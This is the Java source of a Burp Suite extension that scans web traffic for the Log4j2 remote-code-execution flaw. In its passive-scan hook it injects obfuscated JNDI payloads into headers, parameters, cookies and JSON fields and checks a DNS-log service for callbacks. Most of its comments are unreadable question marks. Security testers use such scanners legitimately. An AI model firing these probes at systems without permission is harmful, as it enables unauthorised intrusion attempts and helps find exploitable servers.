package burp.scanner;

import burp.*;
import burp.backend.IBackend;
import burp.backend.platform.Ceye;
import burp.poc.IPOC;
import burp.poc.impl.*;
import burp.utils.HttpHeader;
import burp.utils.HttpUtils;
import burp.utils.ScanItem;
import burp.utils.Utils;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import java.util.*;
import java.util.stream.Collectors;

import static burp.IRequestInfo.CONTENT_TYPE_MULTIPART;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IBackend backend;

    private final String[] HEADER_BLACKLIST = new String[]{
            "content-length",
            "cookie",
            "host",
            "content-type",
            "authorization",
            "authenticate"
    };


    private final String[] HEADER_GUESS = new String[]{
            "User-Agent",
            "Referer",
            "X-Client-IP",
            "X-Remote-IP",
            "X-Remote-Addr",
            "X-Forwarded-For",
            "X-Originating-IP",
            "Originating-IP",
            "CF-Connecting_IP",
            "True-Client-IP",
            "Originating-IP",
            "X-Real-IP",
            "Forwarded",
            "X-Api-Version",
            "X-Wap-Profile",
            "Contact",
            "If-Modified-Since"
    };

    private final String[] STATIC_FILE_EXT = new String[]{
            "png",
            "jpg",
            "gif",
            "pdf",
            "bmp",
            "js",
            "css",
            "ico",
            "woff",
            "woff2",
            "ttf",
            "otf",
            "ttc",
            "svg",
            "psd",
            "exe",
            "zip",
            "rar",
            "7z",
            "msi",
            "tar",
            "gz",
            "mp3",
            "mp4",
            "mkv",
            "swf",
            "xls",
            "xlsx",
            "doc",
            "docx",
            "ppt",
            "pptx",
            "iso"
    };

    private IPOC[] pocs;

    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
        // this.pocs = new IPOC[]{new POC1(), new POC2(), new POC3(), new POC4(), new POC11()};
         this.pocs = new IPOC[]{new POC2(),new POC7(),new POC10(),new POC11()};
         this.backend = new Ceye();
        if (this.backend.getState()) {
            parent.stdout.println("[!] log4j2Scan loaded successfully!");
            parent.stdout.println("[!] modified by p1n93r.\r\n");
        } else {
            parent.stdout.println("[-] backend init failed!\r\n");
        }
    }

    public String urlencodeForTomcat(String exp) {
        exp = exp.replace("{", "%7b");
        exp = exp.replace("}", "%7d");
        return exp;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        if (!isStaticFile(req.getUrl().toString())) {
            parent.stdout.println(String.format("[*] scanning: %s", req.getUrl()));
            Map<String, ScanItem> domainMap = new HashMap<>();
            domainMap.putAll(paramsFuzz(baseRequestResponse, req));
            domainMap.putAll(headerFuzz(baseRequestResponse, req));
            try {
                parent.stdout.println("[*] waitting 60s,then to get query log.");
                //sleep 60s, wait for network delay.
                Thread.sleep(60000);
            } catch (InterruptedException e) {
                parent.stderr.println(String.format("[-] an error has occurred: %s",e.getMessage()));
            }
            issues.addAll(finalCheck(baseRequestResponse, req, domainMap));
            parent.stdout.println(String.format("[*] scan complete: %s", req.getUrl()));
        }
        return issues;
    }

    private boolean isStaticFile(String url) {
        return Arrays.stream(STATIC_FILE_EXT).anyMatch(s -> s.equalsIgnoreCase(HttpUtils.getUrlFileExt(url)));
    }

    private Collection<IPOC> getSupportedPOCs() {
        return Arrays.stream(pocs).filter(p -> Arrays.stream(backend.getSupportedPOCTypes()).anyMatch(c -> c == p.getType())).collect(Collectors.toList());
    }


    /**
     * ?????????DNS???????????????????????????POST.124.207.152.162.oauth.oauth.token
     * ?????????POST 124.207.152.162/oauth/oauth/token
     * ???????????????
     */
    private String getReqTag(IHttpRequestResponse baseRequestResponse, IRequestInfo req){
        List<String> requestHeader = req.getHeaders();
        // ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
        //??????????????????????????????????????????uri???http??????
        String firstrequestHeader = requestHeader.get(0);
        String[] firstheaders = firstrequestHeader.split(" ");
        String uri = firstheaders[1].split("\\?")[0].replace("/",".");
        if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 25) {
            uri = uri.substring(0, 25);
            if (uri.endsWith(".")) {
                uri = uri.substring(0,uri.length()-1);
            }
        }
        if (uri.endsWith(".")) {
            uri = uri.substring(0,uri.length()-1);
        }
        IHttpService httpService = baseRequestResponse.getHttpService();
        String host = httpService.getHost();
        return firstheaders[0].trim() + "." + host  + uri + ".";
    }


    /**
     * fuzz header,?????????HEADER_BLACKLIST??????header????????????fuzz Cookie???header
     * fuzz header????????????????????????????????????????????????????????????ban
     */
    private Map<String, ScanItem> headerFuzz(IHttpRequestResponse baseRequestResponse, IRequestInfo req) {
        List<String> headers = req.getHeaders();
        String requestLine = headers.get(0);
        String logPrefix = getReqTag(baseRequestResponse,req);
        Map<String, ScanItem> domainMap = new HashMap<>();
        try {
            byte[] rawRequest = baseRequestResponse.getRequest();
            String tmpDomain = backend.getNewPayload();
            List<String> guessHeaders = new ArrayList(Arrays.asList(HEADER_GUESS));
            for (IPOC poc : getSupportedPOCs()) {
                ArrayList<HttpHeader> allHeaders = new ArrayList<>();
                // ?????????????????????header
                for (int i = 1; i < headers.size(); i++) {
                    HttpHeader header = new HttpHeader(headers.get(i));
                    if (Arrays.stream(HEADER_BLACKLIST).noneMatch(h -> h.equalsIgnoreCase(header.name))) {
                        List<String> needSkipheader = guessHeaders.stream().filter(h -> h.equalsIgnoreCase(header.name)).collect(Collectors.toList());
                        needSkipheader.forEach(guessHeaders::remove);
                        header.value = poc.generate(Utils.confusionChars((logPrefix+tmpDomain).split("")));
                    }else{
                        // ???????????????header??????????????????????????????
                        allHeaders.add(new HttpHeader(header.toString()));
                    }
                }
                // ????????????????????????????????????header
                for (String headerName : guessHeaders) {
                    allHeaders.add(new HttpHeader(String.format("%s: %s", headerName, poc.generate(Utils.confusionChars((logPrefix+tmpDomain).split(""))))));
                }
                if(allHeaders.size()!=0){
                    ArrayList<String> headersStr = new ArrayList<>();
                    for (HttpHeader header : allHeaders) {
                        headersStr.add(header.toString());
                    }
                    // ??????????????????????????????
                    headersStr.add(0,requestLine);
                    byte[] tmpRawRequest = helper.buildHttpMessage(headersStr, Arrays.copyOfRange(rawRequest, req.getBodyOffset(), rawRequest.length));
                    IHttpRequestResponse tmpResponse = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                    domainMap.put(tmpDomain, new ScanItem(true,"vul in header", tmpResponse));
                }

            }
        } catch (Exception ex) {
            parent.stderr.println(String.format("[-] an error has occurred: %s",ex.getMessage()));
        }
        return domainMap;
    }


    /**
     * fuzz????????????:
     * 1. Cookie???????????????
     * 2. HTTP Form???????????????test=hello
     * 3. JSON????????????????????????{'test':'hello'}
     * 4. JSON???Form??????????????????name=p1n93r&json={'test':'hello'}
     */
    private Map<String, ScanItem> paramsFuzz(IHttpRequestResponse baseRequestResponse, IRequestInfo req) {
        String logPrefix = getReqTag(baseRequestResponse,req);
        Map<String, ScanItem> domainMap = new HashMap<>();

        // ?????????json????????????????????????json???form???????????????
        // ??????????????????json??????
        if(req.getContentType()==IRequestInfo.CONTENT_TYPE_JSON){
            for (IPOC poc : getSupportedPOCs()) {
                String dnslogDomain = backend.getNewPayload();
                String exp = poc.generate(Utils.confusionChars((logPrefix+dnslogDomain).split("")));
                String body = getBody(baseRequestResponse, req);
                //???body??????Json??????
                Object jsonObject = JSON.parse(body);
                // ???exp?????????json???????????????json???????????????
                Object newJsonBody = analysisJson(jsonObject, exp);
                String newBody = newJsonBody.toString();
                byte[] bytes = newBody.getBytes();
                // ???????????????
                List<String> requestHeader = req.getHeaders();
                byte[] newRequest = helper.buildHttpMessage(requestHeader, bytes);
                IHttpRequestResponse tmpResponse = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), newRequest);
                tmpResponse.getResponse();
                domainMap.put(dnslogDomain, new ScanItem(false,"vul in json param", tmpResponse));
            }
        }else{
            // ????????????json???????????????
            byte[] rawRequest = baseRequestResponse.getRequest();
            // ????????????exp?????????HTTP???????????????????????????????????????????????????ban
            String tmpDomain = backend.getNewPayload();
            for (IPOC poc : getSupportedPOCs()) {
                ArrayList<IParameter> allParams = new ArrayList<>();
                for (IParameter param : req.getParameters()) {
                    try {
                        String exp = poc.generate(Utils.confusionChars((logPrefix + tmpDomain).split("")));
                        boolean hasModify = false;
                        // ????????????????????????????????????????????????URL??????
                        switch (param.getType()) {
                            case IParameter.PARAM_URL:
                            case IParameter.PARAM_BODY:

                                // URL??????????????????CONTENT_TYPE_MULTIPART????????????
                                if (req.getContentType() != CONTENT_TYPE_MULTIPART) {
                                    exp = helper.urlEncode(exp);
                                    exp = urlencodeForTomcat(exp);
                                }
                                // ??????????????????????????????????????????CONTENT_TYPE_MULTIPART???????????????????????????URL??????????????????????????????
                                if (req.getContentType() == CONTENT_TYPE_MULTIPART && param.getType() == IParameter.PARAM_URL) {
                                    exp = helper.urlEncode(exp);
                                    exp = urlencodeForTomcat(exp);
                                }
                                hasModify = true;

                                // ?????????????????????????????????json????????????form???json????????????????????????
                                String value = param.getValue();
                                if(value!=null&&!"".equals(value.trim())){
                                    value = helper.urlDecode(value);
                                    boolean isjson = isjson(value);
                                    if(isjson){
                                        String dnsDomain = backend.getNewPayload();
                                        String generateExp = poc.generate(Utils.confusionChars((logPrefix + dnsDomain).split("")));
                                        Object valueObject = JSON.parse(value);
                                        Object vulJson = analysisJson(valueObject,generateExp);
                                        String newExp = helper.urlEncode(vulJson.toString());
                                        newExp = urlencodeForTomcat(newExp);
                                        IParameter newParam = helper.buildParameter(param.getName(),newExp, param.getType());
                                        byte[] tmpNewRequest = helper.updateParameter(rawRequest, newParam);
                                        IHttpRequestResponse tmpResponse = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpNewRequest);
                                        tmpResponse.getResponse();
                                        domainMap.put(dnsDomain, new ScanItem(false, "vul in param", tmpResponse));
                                    }
                                }

                                break;
                            case IParameter.PARAM_COOKIE:
                                // ???????????????springboot???cookie?????????????????????Tomcat??????{}??????????????????
                                // Tomcat Cookie????????????????????????????????????????????????????????????????????????log4j????????????
                                // ?????????????????????Cookie?????????????????????????????????
                                // ??????Cookie????????????????????????????????????Cookie???????????????????????????????????????????????????????????????
                                // ??????Cookie?????????????????????????????????????????????????????????
                                String dnsDomain = backend.getNewPayload();
                                String generateExp = poc.generate(Utils.confusionChars((logPrefix + dnsDomain).split("")));
                                IParameter newParam = helper.buildParameter(param.getName(), generateExp, param.getType());
                                byte[] tmpNewRequest = helper.updateParameter(rawRequest, newParam);
                                IHttpRequestResponse tmpResponse = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpNewRequest);
                                tmpResponse.getResponse();
                                domainMap.put(dnsDomain, new ScanItem(false, "vul in param", tmpResponse));
                                break;
                            // ??????????????????
                            case IParameter.PARAM_JSON:
                            case IParameter.PARAM_XML:
                            case IParameter.PARAM_MULTIPART_ATTR:
                            case IParameter.PARAM_XML_ATTR:
                            default:
                        }
                        // ??????????????????json???form???????????????????????????????????????form??????????????????
                        if (hasModify) {
                            IParameter newParam = helper.buildParameter(param.getName(), exp, param.getType());
                            allParams.add(newParam);
                        }
                    } catch (Exception ex) {
                        parent.stderr.println(String.format("[-] an error has occurred: %s", ex.getMessage()));
                    }
                }
                if(allParams.size()!=0){
                    byte[] tmpRequest = rawRequest;
                    for (IParameter param : allParams) {
                        tmpRequest = helper.updateParameter(tmpRequest, param);
                    }
                    IHttpRequestResponse tmpResponse = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRequest);
                    tmpResponse.getResponse();
                    domainMap.put(tmpDomain, new ScanItem(false,"vul in param", tmpResponse));
                }
            }
        }
        // ?????????CONTENT_TYPE_MULTIPART??????json????????????????????????
        return domainMap;
    }


    /**
     * ???????????????json?????????(??????json??????)
     */
    private boolean isjson(String str){
        try {
            JSONObject.parse(str);
            return  true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * ????????????json??????
     */
    public Object analysisJson(Object objJson,String poc){
        //??????obj???json??????
        if(objJson instanceof JSONArray){
            JSONArray objArray = (JSONArray)objJson;
            for (int i = 0; i < objArray.size(); i++) {
                Object item = objArray.get(i);
                // ????????????????????????????????????????????????????????????poc
                if(item instanceof String){
                    objArray.remove(item);
                    objArray.add(i,poc);
                    continue;
                }
                analysisJson(objArray.get(i),poc);
            }
        }else if(objJson instanceof JSONObject){
            //?????????json??????
            JSONObject jsonObject = (JSONObject)objJson;
            for (String s : jsonObject.keySet()) {
                Object object = jsonObject.get(s);
                //????????????????????????
                if (object instanceof JSONArray) {
                    JSONArray objArray = (JSONArray) object;
                    analysisJson(objArray,poc);
                }
                //??????key????????????json??????
                else if (object instanceof JSONObject) {
                    analysisJson(object,poc);
                }
                //??????key????????????
                else {
                    jsonObject.put(s,poc);
                }
            }
        }
        return objJson;
    }



    /**
     * ???????????????body???????????????body?????????
     */
    public String getBody(IHttpRequestResponse baseRequestResponse, IRequestInfo requestInfo){
        int bodyOffset = requestInfo.getBodyOffset();
        byte[] byteRequest = baseRequestResponse.getRequest();
        //byte[] to String
        String request = new String(byteRequest);
        return request.substring(bodyOffset);
    }



    private List<IScanIssue> finalCheck(IHttpRequestResponse baseRequestResponse, IRequestInfo req, Map<String, ScanItem> domainMap) {
        List<IScanIssue> issues = new ArrayList<>();
        if (backend.flushCache(domainMap.size())) {
            for (Map.Entry<String, ScanItem> domainItem :
                    domainMap.entrySet()) {
                ScanItem item = domainItem.getValue();
                boolean hasIssue = backend.checkResult(domainItem.getKey());
                if (hasIssue) {
                    issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                            req.getUrl(),
                            new IHttpRequestResponse[]{baseRequestResponse, item.tmpResponse},
                            "Log4j2 RCE Detected",
                            String.format("Vulnerable type: %s ,Vul info: %s", item.isHeader ? "header" : "param", item.info),
                            "High"));
                }
            }
        } else {
            parent.stdout.println("[-] get backend result failed!\r\n");
        }
        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
